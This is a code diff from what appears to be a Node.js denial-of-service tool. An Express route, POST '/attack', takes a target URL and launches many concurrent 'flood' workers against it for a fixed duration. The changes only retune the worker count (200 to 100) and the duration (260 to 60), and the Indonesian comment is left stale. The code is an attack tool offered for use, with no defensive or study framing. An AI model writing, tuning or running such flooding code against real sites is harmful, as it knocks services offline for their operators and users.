@@ -84,7 +84,7 @@ const attack = async (target, duration) => {
     }
   };
 
-  const workerCount = 200; // jumlah worker lebih tinggi
+  const workerCount = 100; // jumlah worker lebih tinggi
   const workers = Array.from({ length: workerCount }, () => flood());
   await Promise.all(workers);
 
@@ -99,7 +99,7 @@ app.post('/attack', async (req, res) => {
   try {
     new URL(target);
     C = true;
-    await attack(target, 260);
+    await attack(target, 60);
     C = false;
     res.status(200).json({ status: '[ STARTED ]', target });
   } catch (e) {
